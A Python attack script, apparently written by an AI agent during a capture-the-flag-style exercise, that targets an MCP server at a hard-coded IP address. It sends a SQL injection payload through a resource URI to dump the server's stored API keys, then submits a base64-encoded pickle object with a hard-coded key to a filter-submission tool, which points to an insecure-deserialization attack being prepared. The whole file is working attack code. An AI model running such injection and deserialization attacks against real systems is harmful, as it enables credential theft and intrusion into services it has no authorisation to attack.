#!/usr/bin/env python3
"""
Test Simple Filter Submission
Author: Claude
Purpose: Test the submit_convergence_filter tool with a simple object
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Understand why authentication is failing
Produced Result: TBD
"""

import requests
import json
import base64
import pickle

MCP_URL = "http://154.57.164.74:31735/mcp/"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        resp = requests.post(self.url, json=payload, headers=headers)
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    return json.loads(line[6:])
        return resp.json()

    def initialize(self):
        return self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "test", "version": "1.0"}
        })

    def read_resource(self, uri):
        return self.send_request("resources/read", {"uri": uri})

client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Testing ally/status to find valid API key")
print("="*60)

# First let's get a valid ally API key from the database
# Try SQL injection to list all API keys
sqli_payload = "a' UNION SELECT api_key, ally_name, operational_status FROM allies--"
result = client.read_resource(f"ash-data://ally/status/{sqli_payload}")
print(json.dumps(result, indent=2))

print("\n" + "="*60)
print("Testing Filter Submission")
print("="*60)

# Try with different potential API keys
test_keys = [
    "24a707bb346e2de34aab5d5349591599684a0e7d6280e5750aad30df3a8e38e0",  # From file
]

for test_key in test_keys:
    print(f"\n[*] Testing with key: {test_key[:20]}...")

    # Create a simple filter object
    filter_obj = "test"
    pickled = pickle.dumps(filter_obj)
    encoded = base64.b64encode(pickled).decode('ascii')

    result = client.send_request("tools/call", {
        "name": "submit_convergence_filter",
        "arguments": {
            "ally_api_key": test_key,
            "filter_object": encoded
        }
    })

    print(f"  Result: {json.dumps(result, indent=2)}")
